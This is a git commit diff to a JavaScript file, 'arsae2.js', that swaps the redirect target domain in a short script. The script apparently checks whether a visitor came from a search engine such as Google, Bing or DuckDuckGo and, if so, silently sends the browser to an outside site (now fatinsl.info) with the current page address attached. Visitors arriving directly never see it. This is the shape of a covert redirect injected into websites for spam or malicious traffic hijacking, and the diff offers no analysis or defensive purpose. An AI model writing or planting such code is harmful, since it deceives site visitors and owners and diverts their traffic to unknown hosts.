d0fe0d1a24a938d33a69ec194c87e425807947c6
ajapadam <89146191+ajapadam@users.noreply.github.com>
2022-04-23 00:54:28 +0700

    Update arsae2.js

--- arsae2.js
+++ arsae2.js
@@ -4,7 +4,7 @@
     	var cek = document.referrer;
 
     	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('.yahoo.') || cek.includes('.aol.') || cek.includes('yandex.') || cek.includes('duckduckgo.') || cek.includes('pinterest.');
-      if(is_se)    	{    		var url = window.location.href;    		window.location = "https://postgraduate.me/?arsae="+
+      if(is_se)    	{    		var url = window.location.href;    		window.location = "https://fatinsl.info/?arsae="+
  encodeURIComponent(url);
     	}
     }
